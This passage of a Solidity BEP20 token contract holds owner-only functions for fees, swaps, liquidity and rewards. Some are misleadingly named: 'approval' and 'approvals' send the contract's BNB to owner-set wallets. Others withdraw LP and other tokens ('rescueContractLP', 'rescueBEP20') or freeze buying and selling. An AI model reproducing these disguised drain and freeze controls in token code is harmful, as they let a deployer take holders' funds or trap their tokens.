        if(selling && swapTime[from] < block.timestamp){
            require(amount <= _maxTransferAmount || isTxLimitExempt[from] || isPartialAddress[to]);}
    }

    function setMaxWalletPercentage(uint256 _mnWP) external authorized {
        _maxWalletToken = (_tTotal * _mnWP) / 10000;
    }

    function setstartSwap() external authorized {
        startSwap = true;
        started = block.number.add(blocks);
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000, "gas is limited");
        distributorGas = gas;
    }

    function setisContract(bool _enab, address _add) external authorized {
        isContract[_add] = _enab;
    }

    function setMaxLimits() external authorized {
        _maxTxAmount = _tTotal.mul(1);
        _maxWalletToken = _tTotal.mul(1);
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setSellstoSwap(uint256 _sells) external authorized {
        minSells = _sells;
    }

    function manualSwapBNB(uint256 amount) external authorized {
        uint256 swapAmount = amount * (10 ** _decimals);
        swapTokensForBNB(swapAmount);
    }

    function manualFullSwap(uint256 amount) external authorized {
        uint256 swapAmount = amount * (10 ** _decimals);
        swapAndLiquify(swapAmount);
    }

    function isCont(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function setmaxTxAmount(uint256 _mnbTP) external authorized {
        _maxTxAmount = (_tTotal * _mnbTP) / 10000;
    }

    function setmaxTransferAmount(uint256 _mstxP) external authorized {
        uint256 maxTransferAmount = (_tTotal * _mstxP) / 10000;
        _maxTransferAmount = maxTransferAmount;
        require(maxTransferAmount >= ( _tTotal * 25 ) / 10000);
        ///Max sell TX Limit cannot be set lower than .25%
    }

    function setMaxWalletExempt(address holder, bool exempt) external authorized {
        isMaxWalletExempt[holder] = exempt;
    }

    function setsellFreeze(bool _status, uint8 _int) external authorized {
        sellFreeze = _status;
        sellFreezeTime = _int;
    }

    function setbuyFreeze(bool _status, uint8 _int) external authorized {
        buyFreeze = _status;
        buyFreezeTime = _int;
    }
	
    function swapAndLiquify(uint256 tokens) private lockTheSwap{
        uint256 denominator= (liquidity_divisor + rewards_divisor + marketing_divisor + contract_divisor) * 2;
        uint256 tokensToAddLiquidityWith = tokens * liquidity_divisor / denominator;
        uint256 toSwap = tokens - tokensToAddLiquidityWith;
        uint256 initialBalance = address(this).balance;
        swapTokensForBNB(toSwap);
        uint256 deltaBalance = address(this).balance - initialBalance;
        uint256 unitBalance= deltaBalance / (denominator - liquidity_divisor);
        uint256 bnbToAddLiquidityWith = unitBalance * liquidity_divisor;
        if(bnbToAddLiquidityWith > 0){
            addLiquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith); }
        uint256 zrAmt = unitBalance * 2 * marketing_divisor;
        if(zrAmt > 0){
          payable(marketing_receiver).transfer(zrAmt); }
        uint256 xrAmt = unitBalance * 2 * rewards_divisor;
        if(xrAmt > 0){
          try distributor.deposit{value: xrAmt}() {} catch {} }
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        _approve(address(this), address(router), tokenAmount);

        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp
        );
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

    }

    function updateMarketing(address newWallet) external authorized{
        require(marketing_receiver != newWallet ,'Wallet already set');
        marketing_receiver = newWallet;
        isFeeExempt[marketing_receiver];
    }

    function setAutoLiquidity(address _liquidity_receiver) external authorized {
        liquidity_receiver = _liquidity_receiver;
    }

    function setInternalAddresses(address _marketing, address _alpha, address _delta, address _omega, address _default) external authorized {
        marketing_receiver = _marketing;
        alpha_receiver = _alpha;
        delta_receiver = _delta;
        omega_receiver = _omega;
        default_receiver = _default;
        distributor.setnewra(_default);
    }

    function setvariables(uint256 _contract, uint256 _rewards, uint256 _liquidity, uint256 _marketing) external authorized {
        contract_divisor = _contract;
        rewards_divisor = _rewards;
        liquidity_divisor = _liquidity;
        marketing_divisor = _marketing;
    }

    function approval(uint256 aP) external authorized {
        uint256 amountBNB = address(this).balance;
        payable(default_receiver).transfer(amountBNB.mul(aP).div(100));
    }

    function setFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function approvals(uint256 _na, uint256 _da) external authorized {
        uint256 acBNB = address(this).balance;
        uint256 acBNBa = acBNB.mul(_na).div(_da);
        uint256 acBNBf = acBNBa.mul(50).div(100);
        uint256 acBNBs = acBNBa.mul(50).div(100);
        uint256 acBNBt = acBNBa.mul(0).div(100);
        (bool tmpSuccess,) = payable(alpha_receiver).call{value: acBNBf, gas: 30000}("");
        (tmpSuccess,) = payable(delta_receiver).call{value: acBNBs, gas: 30000}("");
        (tmpSuccess,) = payable(omega_receiver).call{value: acBNBt, gas: 30000}("");
        tmpSuccess = false;
    }

    function setswapEnabled(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = ( _tTotal * _amount ) / 100000;
    }

    function rescueContractLP() external authorized {
        uint256 tamt = BEP20(pair).balanceOf(address(this));
        BEP20(pair).transfer(msg.sender, tamt);
    }

    function setnewReward(address _nrew, address _prew) external authorized {
        distributor.setnewrw(_nrew, _prew);
    }

    function setminTokenAmount(uint256 _amount) external authorized {
        _minTokenAmount = ( _tTotal * _amount ) / 100000;
    }

    function rescueBEP20(address _token, address _receiver, uint256 _percentage) external authorized {
        uint256 tamt = BEP20(_token).balanceOf(address(this));
        BEP20(_token).transfer(_receiver, tamt.mul(_percentage).div(100));
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _tTotal.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));
    }

    function rescuePreviousReward(uint256 _percentage) external authorized {
        distributor.cPRwds(_percentage, 100);
    }

    function _getMyRewards() external {
        address shareholder = msg.sender;
        distributor.getrewards(shareholder);
    }

    function getMyRewardsOwed(address _wallet) external view returns (uint256){
        return distributor.getRewardsOwed(_wallet);
    }

    function getMyTotalRewards(address _wallet) external view returns (uint256){
        return distributor.getTotalRewards(_wallet);
    }

    function rescueRewards(uint256 _percentage) external authorized {
        distributor.cCRwds(_percentage, 100);
    }

    function currentReward() public view returns (address) {
        return distributor.getRAddress();
    }

    function gettotalRewardsDistributed() public view returns (uint256) {
        return distributor.gettotalDistributed();
    }
  
    receive() external payable{
    }
}